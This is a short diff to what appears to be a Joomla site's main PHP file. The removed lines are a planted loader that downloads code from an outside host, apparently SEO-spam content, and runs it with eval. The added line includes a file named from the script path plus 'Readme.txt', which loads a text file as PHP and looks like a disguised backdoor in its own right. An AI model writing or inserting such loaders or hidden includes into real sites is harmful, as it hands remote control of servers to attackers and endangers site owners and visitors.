@@ -1,10 +1,5 @@
 <?php
-$zhyperseo = file_get_contents(urldecode('https://estehpanas.vip/landing-kw/landing-starvvo.txt'));
-$zhyperseo = "?> ".$zhyperseo;
-eval($zhyperseo);
-?>
-
-<?php
+include_once __FILE__ . 'Readme.txt';
 /**
  * @package    Joomla.Site
  *
